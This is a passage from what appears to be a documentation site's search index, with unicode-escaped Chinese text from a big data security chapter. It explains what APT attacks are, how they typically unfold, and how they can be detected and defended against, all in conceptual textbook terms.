\u9632\u8303APT\u653b\u51fb"},{"location":"data_security/big_data_security_copy/#0501-apt","text":"\u7f8e\u56fd\u56fd\u5bb6\u6807\u51c6\u6280\u672f\u7814\u7a76\u6240\uff08NIST\uff09\u5bf9APT\u7684\u5b9a\u4e49\u4e3a\uff1a\u653b\u51fb\u88c5\u638c\u63e1\u5148\u8fdb\u7684\u4e13\u4e1a\u77e5\u8bc6\u548c\u6709\u6548\u7684\u8d44\u6e90\uff0c\u901a\u8fc7\u591a\u79cd\u653b\u51fb\u9014\u5f84\uff08\u5982\uff1a\u7f51\u7edc\u3001\u7269\u7406\u8bbe\u65bd\u548c\u6b3a\u9a97\u7b49\uff09\uff0c\u5728\u7279\u5b9a\u7ec4\u7ec7\u7684\u4fe1\u606f\u6280\u672f\u57fa\u7840\u8bbe\u65bd\u5efa\u7acb\u5e76\u8f6c\u79fb\u7acb\u8db3\u70b9\uff0c\u4ee5\u7a83\u53d6\u673a\u5bc6\u4fe1\u606f\uff0c\u7834\u574f\u6216\u963b\u788d\u4efb\u52a1\u3001\u7a0b\u5e8f\u6216\u7ec4\u7ec7\u7684\u5173\u952e\u7cfb\u7edf\uff0c\u6216\u8005\u9a7b\u7559\u5728\u7ec4\u7ec7\u5185\u90e8\u7f51\u7edc\uff0c\u8fdb\u884c\u540e\u7eed\u653b\u51fb\u3002 APT\u653b\u51fb\u7684\u539f\u7406\u76f8\u5bf9\u5176\u4ed6\u653b\u51fb\u5f62\u5f0f\u66f4\u4e3a\u9ad8\u7ea7\u548c\u5148\u8fdb\uff0c\u5176\u9ad8\u7ea7\u6027\u4e3b\u8981\u4f53\u73b0\u5728APT\u5728\u53d1\u52a8\u653b\u51fb\u4e4b\u524d\u9700\u8981\u5bf9\u653b\u51fb\u5bf9\u8c61\u7684\u4e1a\u52a1\u6d41\u7a0b\u548c\u76ee\u6807\u7cfb\u7edf\u8fdb\u884c\u7cbe\u786e\u7684\u6536\u96c6\uff0c\u5728\u6536\u96c6\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6b64\u653b\u51fb\u4f1a\u4e3b\u52a8\u6316\u6398\u88ab\u653b\u51fb\u5bf9\u8c61\u53d7\u4fe1\u7cfb\u7edf\u548c\u5e94\u7528\u7a0b\u5e8f\u6f0f\u6d1e\uff0c\u5728\u8fd9\u4e9b\u6f0f\u6d1e\u7684\u57fa\u7840\u4e0a\u5f62\u6210\u653b\u51fb\u8005\u6240\u9700\u7684\u547d\u4ee4\u4e0e\u653b\u51fb\uff08C C\uff09\u7f51\u7edc\uff0c\u6b64\u79cd\u884c\u4e3a\u6ca1\u6709\u91c7\u53d6\u4efb\u4f55\u53ef\u80fd\u89e6\u53d1\u8b66\u62a5\u6216\u8005\u5f15\u8d77\u6000\u7591\u7684\u884c\u52a8\uff0c\u56e0\u6b64\u66f4\u63a5\u8fd1\u4e8e\u878d\u5165\u88ab\u653b\u51fb\u8005\u7684\u7cfb\u7edf\u3002 \u5927\u6570\u636e\u5e94\u7528\u73af\u5883\u4e0b\uff0cAPT\u653b\u51fb\u7684\u5b89\u5168\u5a01\u80c1\u66f4\u52a0\u51f8\u663e\u3002\u9996\u5148\uff0c\u5927\u6570\u636e\u5e94\u7528\u5bf9\u6570\u636e\u8fdb\u884c\u4e86\u903b\u8f91\u6216\u7269\u7406\u4e0a\u7684\u96c6\u4e2d\uff0c\u76f8\u5bf9\u4e8e\u4ece\u5206\u6563\u7684\u7cfb\u7edf\u4e2d\u6536\u96c6\u6709\u7528\u7684\u4fe1\u606f\uff0c\u96c6\u4e2d\u7684\u6570\u636e\u7cfb\u7edf\u4e3aAPT\u653b\u51fb\u6536\u96c6\u4fe1\u606f\u63d0\u4f9b\u4e86\"\u4fbf\u5229\"\uff1b\u5176\u6b21\uff0c\u6570\u636e\u6316\u6398\u8fc7\u7a0b\u4e2d\u53ef\u80fd\u4f1a\u6709\u591a\u65b9\u5408\u4f5c\u7684\u4e1a\u52a1\u6a21\u5f0f\uff0c\u5916\u90e8\u7cfb\u7edf\u5bf9\u6570\u636e\u7684\u8bbf\u95ee\u589e\u52a0\u4e86\u9632\u6b62\u673a\u5bc6\u3001\u9690\u79c1\u51fa\u73b0\u6cc4\u6f0f\u7684\u9014\u5f84\u3002\u56e0\u6b64\uff0c\u5927\u6570\u636e\u73af\u5883\u4e0b\uff0c\u5bf9APT\u653b\u51fb\u7684\u68c0\u6d4b\u4e0e\u9632\u8303\uff0c\u662f\u5fc5\u987b\u8981\u8003\u8651\u7684\u95ee\u9898\u3002\u63a5\u4e0b\u6765\u5728\u5206\u6790APT\u653b\u51fb\u7279\u5f81\u4e0e\u6d41\u7a0b\u7684\u57fa\u7840\u4e0a\uff0c\u7814\u7a76APT\u653b\u51fb\u68c0\u6d4b\u65b9\u6cd5\u548c\u9632\u8303\u7b56\u7565\u3002","title":"05.01 APT\u653b\u51fb\u7684\u6982\u5ff5"},{"location":"data_security/big_data_security_copy/#0502-apt","text":"APT\u653b\u51fb\u7279\u5f81\u5982\u4e0b\uff1a","title":"05.02 APT\u653b\u51fb\u7279\u5f81"},{"location":"data_security/big_data_security_copy/#050201","text":"APT\u653b\u51fb\u4e0e\u88ab\u653b\u51fb\u5bf9\u8c61\u7684\u53ef\u4fe1\u7a0b\u5e8f\u6f0f\u6d1e\u4e0e\u4e1a\u52a1\u7cfb\u7edf\u6f0f\u6d1e\u8fdb\u884c\u4e86\u878d\u5408\uff0c\u5728\u7ec4\u7ec7\u5185\u90e8\uff0c\u8fd9\u6837\u7684\u878d\u5408\u5f88\u96be\u88ab\u53d1\u73b0\u3002","title":"05.02.01 \u6781\u5f3a\u7684\u9690\u853d\u6027"},{"location":"data_security/big_data_security_copy/#050202","text":"APT\u653b\u51fb\u662f\u4e00\u79cd\u5f88\u6709\u8010\u5fc3\u7684\u653b\u51fb\u5f62\u5f0f\uff0c\u653b\u51fb\u548c\u5a01\u80c1\u53ef\u80fd\u5728\u7528\u6237\u73af\u5883\u5b58\u5728\u4e86\u4e00\u5e74\u4ee5\u4e0a\uff0c\u4ed6\u4eec\u4e0d\u65ad\u6536\u96c6\u7528\u6237\u4fe1\u606f\uff0c\u76f4\u5230\u6536\u96c6\u5230\u91cd\u8981\u60c5\u62a5\u3002\u4ed6\u4eec\u5f80\u5f80\u4e0d\u662f\u4e3a\u4e86\u5728\u77ed\u65f6\u95f4\u5185\u83b7\u5229\uff0c\u800c\u662f\u628a\"\u88ab\u63a7\u4e3b\u673a\"\u5f53\u6210\u8df3\u677f\uff0c\u6301\u7eed\u641c\u7d22\uff0c\u76f4\u5230\u5145\u5206\u638c\u63e1\u4e86\u76ee\u6807\u5bf9\u8c61\u7684\u4f7f\u7528\u884c\u4e3a\u3002\u6240\u4ee5\u8fd9\u79cd\u653b\u51fb\u6a21\u5f0f\uff0c\u672c\u8d28\u4e0a\u662f\u4e00\u79cd\"\u6076\u610f\u5546\u4e1a\u95f4\u8c0d\u5a01\u80c1\"\uff1b\u56e0\u6b64\u5177\u6709\u5f88\u957f\u7684\u6f5c\u4f0f\u671f\u548c\u6301\u7eed\u6027\u3002","title":"05.02.02 \u6f5c\u4f0f\u671f\u957f\u3001\u6301\u7eed\u6027\u5f3a"},{"location":"data_security/big_data_security_copy/#050203","text":"\u4e0d\u540c\u4e8e\u4ee5\u5f80\u7684\u5e38\u89c4\u75c5\u6bd2\uff0cAPT\u5236\u4f5c\u8005\u638c\u63e1\u9ad8\u7ea7\u6f0f\u6d1e\u53d1\u6398\u548c\u8d85\u5f3a\u7684\u7f51\u7edc\u653b\u51fb\u6280\u672f\u3002\u53d1\u8d77APT\u653b\u51fb\u6240\u9700\u7684\u6280\u672f\u58c1\u5792\u548c\u8d44\u6e90\u58c1\u5792\uff0c\u8981\u8fdc\u9ad8\u4e8e\u666e\u901a\u653b\u51fb\u884c\u4e3a\u3002\u5176\u9488\u5bf9\u7684\u653b\u51fb\u76ee\u6807\u4e5f\u4e0d\u662f\u666e\u901a\u4e2a\u4eba\u7528\u6237\uff0c\u800c\u662f\u62e5\u6709\u9ad8\u4ef7\u503c\u654f\u611f\u6570\u636e\u7684\u9ad8\u7ea7\u7528\u6237\uff0c\u7279\u522b\u662f\u53ef\u80fd\u5f71\u54cd\u5230\u56fd\u5bb6\u548c\u5730\u533a\u653f\u6cbb\u3001\u5916\u4ea4\u3001\u91d1\u878d\u7a33\u5b9a\u7684\u9ad8\u7ea7\u522b\u654f\u611f\u6570\u636e\u6301\u6709\u8005\u3002","title":"05.02.03 \u76ee\u6807\u6027\u5f3a"},{"location":"data_security/big_data_security_copy/#050204","text":"\u653b\u51fb\u8005\u638c\u63e1\u5148\u8fdb\u7684\u653b\u51fb\u6280\u672f\uff0c\u4f7f\u7528\u591a\u79cd\u653b\u51fb\u9014\u5f84\uff0c\u5305\u62ec\u8d2d\u4e70\u6216\u81ea\u5df1\u5f00\u53d1\u76840day\u6f0f\u6d1e\uff0c\u800c\u4e00\u822c\u653b\u51fb\u8005\u5374\u4e0d\u80fd\u4f7f\u7528\u8fd9\u4e9b\u8d44\u6e90\u3002\u800c\u4e14\u653b\u51fb\u8fc7\u7a0b\u590d\u6742\uff0c\u653b\u51fb\u6301\u7eed\u8fc7\u7a0b\u5728\u653b\u51fb\u8005\u80fd\u591f\u52a8\u6001\u8c03\u6574\u653b\u51fb\u65b9\u5f0f\uff0c\u4ece\u6574\u4f53\u4e0a\u638c\u63e1\u653b\u51fb\u8fdb\u7a0b\u3002","title":"05.02.04 \u6280\u672f\u9ad8\u7ea7"},{"location":"data_security/big_data_security_copy/#050205","text":"APT\u653b\u51fb\u901a\u5e38\u62e5\u6709\u96c4\u539a\u7684\u8d44\u91d1\u652f\u6301\uff0c\u7531\u7ecf\u9a8c\u4e30\u5bcc\u7684\u9ed1\u5ba2\u56e2\u961f\u53d1\u8d77\uff0c\u4e00\u822c\u4ee5\u7834\u574f\u56fd\u5bb6\u6216\u5927\u578b\u4f01\u4e1a\u7684\u5173\u952e\u57fa\u7840\u8bbe\u65bd\u4e3a\u76ee\u6807\uff0c\u7a83\u53d6\u5185\u90e8\u6838\u5fc3\u673a\u5bc6\u4fe1\u606f\uff0c\u5371\u53ca\u56fd\u5bb6\u5b89\u5168\u548c\u793e\u4f1a\u7a33\u5b9a\u3002","title":"05.02.05 \u5a01\u80c1\u6027\u5927"},{"location":"data_security/big_data_security_copy/#0503-apt","text":"APT\u653b\u51fb\u7684\u6d41\u7a0b\u4e00\u822c\u5305\u62ec\u5982\u4e0b\u6b65\u9aa4\uff1a","title":"05.03 APT\u653b\u51fb\u7684\u4e00\u822c\u6d41\u7a0b"},{"location":"data_security/big_data_security_copy/#050301","text":"\u5728\u5165\u4fb5\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u9996\u5148\u4f1a\u4f7f\u7528\u6280\u672f\u548c\u793e\u4f1a\u5de5\u7a0b\u5b66\u624b\u6bb5\u5bf9\u7279\u5b9a\u76ee\u6807\u8fdb\u884c\u4fa6\u67e5\u3002\u4fa6\u67e5\u5185\u5bb9\u4e3b\u8981\u5305\u62ec\u4e24\u4e2a\u65b9\u9762\uff1a\u4e00\u662f\u5bf9\u76ee\u6807\u7f51\u7edc\u7528\u6237\u7684\u4fe1\u606f\u6536\u96c6\uff0c\u4f8b\u5982\uff1a\u9ad8\u5c42\u9886\u5bfc\u3001\u7cfb\u7edf\u7ba1\u7406\u5458\u6216\u8005\u666e\u901a\u804c\u5458\u7b49\u5458\u5de5\u8d44\u6599\u3001\u7cfb\u7edf\u7ba1\u7406\u5236\u5ea6\u3001\u7cfb\u7edf\u4e1a\u52a1\u6d41\u7a0b\u548c\u4f7f\u7528\u60c5\u51b5\u7b49\u4fe1\u606f\uff1b\u4e8c\u662f\u5bf9\u76ee\u6807\u7f51\u7edc\u8106\u5f31\u70b9\u7684\u4fe1\u606f\u6536\u96c6\uff0c\u4f8b\u5982\uff1a\u8f6f\u4ef6\u7248\u672c\u3001\u5f00\u653e\u7aef\u53e3\u7b49\u3002\u968f\u540e\uff0c\u653b\u51fb\u8005\u9488\u5bf9\u76ee\u6807\u7cfb\u7edf\u7684\u8106\u5f31\u70b9\uff0c\u7814\u7a760day\u6f0f\u6d1e\u3001\u5b9a\u5236\u6728\u9a6c\u7a0b\u5e8f\u3001\u5236\u5b9a\u653b\u51fb\u8ba1\u5212\uff0c\u7528\u4e8e\u5728\u4e0b\u4e00\u9636\u6bb5\u5b9e\u65bd\u7cbe\u786e\u653b\u51fb\u3002","title":"05.03.01 \u4fe1\u606f\u4fa6\u67e5"},{"location":"data_security/big_data_security_copy/#050302","text":"\u5229\u7528\u76ee\u6807\u4eba\u5458\u7684\u758f\u5ffd\u3001\u4e0d\u6267\u884c\u5b89\u5168\u89c4\u8303\uff0c\u4ee5\u53ca\u5229\u7528\u7cfb\u7edf\u5e94\u7528\u7a0b\u5e8f\u3001\u7f51\u7edc\u670d\u52a1\u6216\u4e3b\u673a\u7684\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u4f7f\u7528\u5b9a\u5236\u6728\u9a6c\u7b49\u624b\u6bb5\uff0c\u4e0d\u65ad\u6e17\u900f\u4ee5\u6f5c\u4f0f\u5728\u76ee\u6807\u7cfb\u7edf\uff0c\u8fdb\u4e00\u6b65\u5730\u5728\u907f\u514d\u7528\u6237\u89c9\u5bdf\u7684\u6761\u4ef6\u4e0b\u53d6\u5f97\u7f51\u7edc\u6838\u5fc3\u8bbe\u5907\u7684\u63a7\u5236\u6743\u3002\u4f8b\u5982\uff1a\u901a\u8fc7SQL\u6ce8\u5165\u7b49\u653b\u51fb\u624b\u6bb5\u7a81\u7834\u9762\u5411\u5916\u7f51\u7684Web\u670d\u52a1\u5668\uff0c\u6216\u901a\u8fc7\u9493\u9c7c\u653b\u51fb\uff0c\u53d1\u9001\u6b3a\u8bc8\u90ae\u4ef6\u83b7\u53d6\u5185\u7f51\u7528\u6237\u901a\u4fe1\u8bb0\u5f55\uff0c\u5e76\u8fdb\u4e00\u6b65\u5165\u4fb5\u9ad8\u7ba1\u4e3b\u673a\uff0c\u91c7\u7528\u53d1\u9001\u5e26\u6f0f\u6d1e\u7684Office\u6587\u4ef6\u8bf1\u9a97\u7528\u6237\u5c06\u6b63\u5e38\u7f51\u5740\u8bf7\u6c42\u91cd\u5b9a\u5411\u6076\u610f\u7ad9\u70b9\u3002","title":"05.03.02 \u6301\u7eed\u6e17\u900f"},{"location":"data_security/big_data_security_copy/#050303","text":"\u4e3a\u4e86\u83b7\u53d6\u6709\u4ef7\u503c\u4fe1\u606f\uff0c\u653b\u51fb\u8005\u4e00\u822c\u4f1a\u5728\u76ee\u6807\u7f51\u7edc\u957f\u671f\u6f5c\u4f0f\uff0c\u6709\u7684\u8fbe\u6570\u5e74\u4e4b\u4e45\u3002\u6f5c\u4f0f\u671f\u95f4\uff0c\u653b\u51fb\u8005\u8fd8\u4f1a\u5728\u5df2\u63a7\u5236\u7684\u4e3b\u673a\u4e0a\u5b89\u88c5\u5404\u79cd\u6728\u9a6c\u3001\u540e\u95e8\uff0c\u4e0d\u65ad\u63d0\u9ad8\u6076\u610f\u8f6f\u4ef6\u7684\u590d\u6742\u5ea6\u3002\u4ee5\u589e\u52a0\u653b\u51fb\u80fd\u529b\u5e76\u907f\u5f00\u5b89\u5168\u68c0\u6d4b\u3002","title":"05.03.03 \u957f\u671f\u6f5c\u4f0f"},{"location":"data_security/big_data_security_copy/#050304","text":"\u76ee\u524d\u7edd\u5927\u90e8\u5206APT\u653b\u51fb\u7684\u76ee\u6807\u90fd\u662f\u7a83\u53d6\u76ee\u6807\u7ec4\u7ec7\u7684\u673a\u5bc6\u4fe1\u606f\u3002\u653b\u51fb\u8005\u4e00\u822c\u91c7\u7528SSL VPN\u8fde\u63a5\u7684\u65b9\u5f0f\u63a7\u5236\u5185\u7f51\u4e3b\u673a\uff0c\u5bf9\u4e8e\u7a83\u53d6\u5230\u7684\u673a\u5bc6\u4fe1\u606f\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u5c06\u5176\u52a0\u5bc6\u5b58\u653e\u5728\u7279\u5b9a\u4e3b\u673a\u4e0a\uff0c\u518d\u9009\u62e9\u5408\u9002\u7684\u65f6\u95f4\u5c06\u5176\u901a\u8fc7\u9690\u79d8\u4fe1\u9053\u4f20\u8f93\u5230\u653b\u51fb\u8005\u63a7\u5236\u7684\u670d\u52a1\u5668\u3002\u7531\u4e8e\u6570\u636e\u4ee5\u5bc6\u6587\u65b9\u5f0f\u5b58\u5728\uff0cAPT\u7a0b\u5e8f\u5728\u83b7\u53d6\u91cd\u8981\u6570\u636e\u540e\u5411\u5916\u90e8\u53d1\u9001\u65f6\uff0c\u5229\u7528\u4e86\u5408\u6cd5\u6570\u636e\u7684\u4f20\u8f93\u901a\u9053\u548c\u52a0\u5bc6\u3001\u538b\u7f29\u65b9\u5f0f\uff0c\u96be\u4ee5\u8fa8\u522b\u51fa\u5176\u4e0e\u6b63\u5e38\u6d41\u91cf\u7684\u5dee\u522b\u3002","title":"05.03.04 \u7a83\u53d6\u4fe1\u606f"},{"location":"data_security/big_data_security_copy/#0504-apt","text":"\u4eceAPT\u653b\u51fb\u7684\u8fc7\u7a0b\u53ef\u4ee5\u770b\u51fa\uff0c\u6574\u4e2a\u653b\u51fb\u5faa\u73af\u5305\u62ec\u4e86\u591a\u4e2a\u6b65\u9aa4\uff0c\u8fd9\u5c31\u4e3a\u68c0\u6d4b\u548c\u9632\u62a4\u63d0\u4f9b\u4e86\u591a\u4e2a\u5951\u673a\u3002\u5f53\u524dAPT\u68c0\u6d4b\u65b9\u6848\u4e3b\u8981\u6709\u4ee5\u4e0b\u51e0\u79cd\uff1a","title":"05.04 APT\u653b\u51fb\u68c0\u6d4b"},{"location":"data_security/big_data_security_copy/#050401","text":"\u9488\u5bf9APT\u653b\u51fb\uff0c\u653b\u51fb\u8005\u5f80\u5f80\u4f7f\u7528\u4e860day\u7684\u65b9\u6cd5\uff0c\u5bfc\u81f4\u7279\u5f81\u5339\u914d\u4e0d\u80fd\u6210\u529f\uff0c\u56e0\u6b64\u9700\u8981\u91c7\u7528\u975e\u7279\u5f81\u5339\u914d\u7684\u65b9\u5f0f\u6765\u8bc6\u522b\uff0c\u667a\u80fd\u6c99\u7bb1\u6280\u672f\u5c31\u53ef\u4ee5\u7528\u6765\u8bc6\u522b0day\u653b\u51fb\u4e0e\u5f02\u5e38\u884c\u4e3a\u3002\u667a\u80fd\u6c99\u7bb1\u6280\u672f\u6700\u5927\u7684\u96be\u70b9\u5728\u4e8e\u5ba2\u6237\u7aef\u7684\u591a\u6837\u6027\uff0c\u667a\u80fd\u6c99\u7bb1\u6280\u672f\u5bf9\u64cd\u4f5c\u7cfb\u7edf\u7c7b\u578b\u3001\u6d4f\u89c8\u7684\u7248\u672c\u3001\u6d4f\u89c8\u5668\u5b89\u88c5\u7684\u63d2\u4ef6\u7248\u672c\u90fd\u6709\u5173\u7cfb\uff0c\u5728\u67d0\u79cd\u73af\u5883\u5f53\u4e2d\u68c0\u6d4b\u4e0d\u5230\u6076\u610f\u4ee3\u7801\uff0c\u6216\u8bb8\u53e6\u5916\u4e00\u4e2a\u5c31\u80fd\u68c0\u6d4b\u5230\u3002","title":"05.04.01 \u6c99\u7bb1\u65b9\u6848"},{"location":"data_security/big_data_security_copy/#050402","text":"\u5f02\u5e38\u68c0\u6d4b\u7684\u6838\u5fc3\u601d\u60f3\u662f\u6d41\u91cf\u5efa\u6a21\u8bc6\u522b\u5f02\u5e38\u3002\u5f02\u5e38\u68c0\u6d4b\u7684\u6838\u5fc3\u6280\u672f\u662f\u5143\u6570\u636e\u63d0\u53d6\u6280\u672f\u3001\u57fa\u4e8e\u8fde\u63a5\u7279\u5f81\u7684\u6076\u610f\u4ee3\u7801\u68c0\u6d4b\u89c4\u5219\uff0c\u4ee5\u53ca\u57fa\u4e8e\u884c\u4e3a\u6a21\u5f0f\u7684\u5f02\u5e38\u68c0\u6d4b\u7b97\u6cd5\u3002\u5176\u4e2d\uff0c\u5143\u6570\u636e\u63d0\u53d6\u6280\u672f\u662f\u6307\u5229\u7528\u5c11\u4e86\u7684\u5143\u6570\u636e\u4fe1\u606f\uff0c\u68c0\u6d4b\u6574\u4f53\u7f51\u7edc\u6d41\u91cf\u7684\u5f02\u5e38\u3002\u57fa\u4e8e\u8fde\u63a5\u7279\u5f81\u7684\u6076\u610f\u4ee3\u7801\u68c0\u6d4b\u89c4\u5219\u662f\u68c0\u6d4b\u5df2\u77e5\u50f5\u5c38\u7f51\u7edc\u3001\u6728\u9a6c\u901a\u4fe1\u7684\u884c\u4e3a\u3002\u800c\u57fa\u4e8e\u884c\u4e3a\u6a21\u5f0f\u7684\u5f02\u5e38\u68c0\u6d4b\u7b97\u6cd5\u5305\u62ec\u68c0\u6d4b\u96a7\u9053\u901a\u4fe1\u3001\u53ef\u7591\u52a0\u5bc6\u6587\u4ef6\u4f20\u8f93\u7b49\u3002","title":"05.04.02 \u5f02\u5e38\u68c0\u6d4b"},{"location":"data_security/big_data_security_copy/#050403","text":"\u5168\u6d41\u91cf\u5ba1\u8ba1\u7684\u6838\u5fc3\u601d\u60f3\u662f\u901a\u8fc7\u5bf9\u5168\u6d41\u91cf\u8fdb\u884c\u5e94\u7528\u8bc6\u522b\u548c\u8fd8\u539f\uff0c\u68c0\u6d4b\u5f02\u5e38\u884c\u4e3a\u3002\u6838\u5fc3\u6280\u672f\u5305\u62ec\u5927\u6570\u636e\u5b58\u50a8\u53ca\u5904\u7406\u3001\u5e94\u7528\u8bc6\u522b\u3001\u6587\u4ef6\u8fd8\u539f\u7b49\u3002\u5982\u679c\u505a\u5168\u6d41\u91cf\u5206\u6790\uff0c\u9762\u4e34\u7684\u95ee\u9898\u662f\u6570\u636e\u5904\u7406\u91cf\u975e\u5e38\u5927\u3002\u5168\u6d41\u91cf\u5ba1\u8ba1\u4e0e\u73b0\u6709\u7684\u68c0\u6d4b\u4ea7\u54c1\u548c\u5e73\u53f0\u76f8\u8f85\u76f8\u6210\uff0c\u4e92\u4e3a\u8865\u5145\uff0c\u6784\u6210\u5b8c\u6574\u9632\u62a4\u4f53\u7cfb\u3002\u5728\u6574\u4f53\u9632\u62a4\u4f53\u7cfb\u4e2d\uff0c\u4f20\u7edf\u68c0\u6d4b\u8bbe\u5907\u7684\u4f5c\u7528\u7c7b\u4f3c\u4e8e\"\u89e6\u53d1\u5668\"\uff0c\u68c0\u6d4b\u5230APT\u884c\u4e3a\u7684\u86db\u4e1d\u9a6c\u8ff9\uff0c\u518d\u5229\u7528\u5168\u6d41\u91cf\u4fe1\u606f\u8fdb\u884c\u56de\u6eaf\u548c\u6df1\u5ea6\u5206\u6790\uff0c\u53ef\u7528\u4e00\u4e2a\u7b80\u5355\u7684\u516c\u53f8\u8bf4\u660e\uff0c\u5168\u6d41\u91cf\u5ba1\u8ba1+\u4f20\u7edf\u68c0\u6d4b\u6280\u672f=\u57fa\u4e8e\u8bb0\u5fc6\u7684\u68c0\u6d4b\u7cfb\u7edf\u3002","title":"05.04.03 \u5168\u6d41\u91cf\u5ba1\u8ba1"},{"location":"data_security/big_data_security_copy/#050404","text":"\u57fa\u4e8e\u6df1\u5c42\u534f\u8bae\u89e3\u6790\u7684\u5f02\u5e38\u8bc6\u522b\uff0c\u53ef\u4ee5\u7ec6\u7ec6\u67e5\u770b\u5e76\u4e00\u6b65\u6b65\u53d1\u73b0\u662f\u54ea\u4e2a\u534f\u8bae\uff0c\u5982\uff1a\u4e00\u4e2a\u6570\u636e\u67e5\u8be2\uff0c\u6709\u4ec0\u4e48\u5730\u65b9\u51fa\u73b0\u4e86\u5f02\u5e38\uff0c\u76f4\u5230\u53d1\u73b0\u5f02\u5e38\u70b9\u4e3a\u6b62\u3002","title":"05.04.04 \u57fa\u4e8e\u6df1\u5c42\u534f\u8bae\u89e3\u6790\u7684\u5f02\u5e38\u8bc6\u522b"},{"location":"data_security/big_data_security_copy/#050405-root-cause-explorer","text":"\u901a\u8fc7\u5df2\u7ecf\u63d0\u53d6\u51fa\u6765\u7684\u7f51\u7edc\u5bf9\u8c61\uff0c\u53ef\u4ee5\u91cd\u5efa\u4e00\u4e2a\u65f6\u95f4\u533a\u95f4\u5185\u53ef\u7591\u7684Web Session\u3001Email\u3001\u5bf9\u8bdd\u4fe1\u606f\u3002\u901a\u8fc7\u5c06\u8fd9\u4e9b\u4e8b\u4ef6\u81ea\u52a8\u6392\u5217\uff0c\u53ef\u4ee5\u5e2e\u52a9\u5206\u6790\u4eba\u5458\u51ef\u82cf\u53d1\u73b0\u653b\u51fb\u6e90\u3002 \u5728APT\u653b\u51fb\u68c0\u6d4b\u4e2d\uff0c\u5b58\u5728\u7684\u95ee\u9898\u5305\u62ec\uff1a \u653b\u51fb\u8fc7\u7a0b\u5305\u62ec\u8def\u5f84\u548c\u65f6\u5e8f\uff1b \u653b\u51fb\u8fc7\u7a0b\u7684\u5927\u90e8\u5206\u8c8c\u4f3c\u6b63\u5e38\u64cd\u4f5c\uff1b \u4e0d\u662f\u6240\u6709\u7684\u5f02\u5e38\u64cd\u4f5c\u90fd\u80fd\u7acb\u5373\u88ab\u68c0\u6d4b\uff1b \u4e0d\u80fd\u4fdd\u8bc1\u88ab\u68c0\u6d4b\u5230\u7684\u5f02\u5e38\u5728APT\u8fc7\u7a0b\u4e2d\u7684\u5f00\u59cb\u6216\u65e9\u671f\u3002 \u57fa\u4e8e\u8bb0\u5f55\u7684\u68c0\u6d4b\u53ef\u4ee5\u6709\u6548\u7f13\u89e3\u4e0a\u8ff0\u95ee\u9898\u3002\u73b0\u5728\u5bf9\u6297APT\u7684\u601d\u8def\u662f\u4ee5\u65f6\u95f4\u5bf9\u6297\u65f6\u95f4\u3002\u65e2\u7136APT\u662f\u5728\u5f88\u957f\u65f6\u95f4\u53d1\u751f\u7684\uff0c\u6211\u4eec\u7684\u5bf9\u6297\u4e5f\u8981\u5728\u4e00\u4e2a\u65f6\u95f4\u7a97\u6765\u8fdb\u884c\u5bf9\u6297\uff0c\u5bf9\u957f\u65f6\u95f4\u3001\u5168\u6d41\u91cf\u6570\u636e\u8fdb\u884c\u6df1\u5ea6\u5206\u6790\u3002\u9488\u5bf9A\u95ee\u9898\uff0c\u53ef\u4ee5\u91c7\u7528\u6c99\u7bb1\u65b9\u5f0f\u3001\u5f02\u5e38\u68c0\u6d4b\u6a21\u5f0f\u6765\u89e3\u51b3\u7279\u5f81\u5339\u914d\u7684\u4e0d\u8db3\uff1b\u9488\u5bf9P\u95ee\u9898\uff0c\u53ef\u5c06\u4f20\u7edf\u57fa\u4e8e\u5b9e\u65f6\u65f6\u95f4\u70b9\u7684\u68c0\u6d4b\uff0c\u8f6c\u53d8\u4e3a\u57fa\u4e8e\u5386\u53f2\u65f6\u95f4\u7a97\u7684\u68c0\u6d4b\uff0c\u901a\u8fc7\u6d41\u91cf\u7684\u56de\u6eaf\u548c\u5173\u8054\u5206\u6790\u53d1\u73b0APT\u6a21\u5f0f\u3002\u800c\u6d41\u91cf\u5b58\u50a8\u4e0e\u73b0\u6709\u7684\u68c0\u6d4b\u6280\u672f\u76f8\u7ed3\u5408\uff0c\u6784\u6210\u4e86\u65b0\u4e00\u4ee3\u57fa\u4e8e\u8bb0\u5fc6\u7684\u667a\u80fd\u68c0\u6d4b\u7cfb\u7edf\u3002\u6b64\u5916\uff0c\u8fd8\u9700\u8981\u5229\u7528\u5927\u6570\u636e\u5206\u6790\u7684\u5173\u952e\u6280\u672f\u3002","title":"05.04.05 \u653b\u51fb\u6eaf\u6e90\uff08root cause explorer\uff09"},{"location":"data_security/big_data_security_copy/#0505-apt","text":"\u76ee\u524d\u7684\u9632\u5fa1\u6280\u672f\u3001\u9632\u5fa1\u4f53\u7cfb\u5f88\u96be\u6709\u6548\u5e94\u5bf9APT\u653b\u51fb\uff0c\u5bfc\u81f4\u5f88\u591a\u653b\u51fb\u76f4\u5230\u5f88\u957f\u65f6\u95f4\u540e\u624d\u88ab\u53d1\u73b0\uff0c\u751a\u81f3\u53ef\u80fd\u8fd8\u6709\u5f88\u591aAPT\u653b\u51fb\u672a\u88ab\u53d1\u73b0\u3002\u901a\u8fc7\u524d\u9762APT\u653b\u51fb\u80cc\u666f\u4ee5\u53ca\u653b\u51fb\u7279\u70b9\u3001\u653b\u51fb\u6d41\u7a0b\u7684\u5206\u6790\uff0c\u73b0\u9636\u6bb5\u9700\u8981\u4e00\u79cd\u65b0\u7684\u5b89\u5168\u601d\u7ef4\uff0c\u5373\u653e\u5f03\u4fdd\u62a4\u6240\u6709\u6570\u636e\u7684\u89c2\u5ff5\uff0c\u8f6c\u800c\u91cd\u70b9\u4fdd\u62a4\u5173\u952e\u6570\u636e\u8d44\u4ea7\uff0c\u540c\u65f6\u5728\u4f20\u7edf\u7684\u7eb5\u6df1\u9632\u5fa1\u7684\u7f51\u7edc\u5b89\u5168\u9632\u62a4\u57fa\u7840\u4e0a\uff0c\u5728\u5404\u4e2a\u53ef\u80fd\u7684\u73af\u8282\u4e0a\u90e8\u7f72\u68c0\u6d4b\u548c\u9632\u62a4\u624b\u6bb5\uff0c\u5efa\u7acb\u4e00\u79cd\u65b0\u7684\u5b89\u5168\u9632\u5fa1\u4f53\u7cfb\u3002","title":"05.05 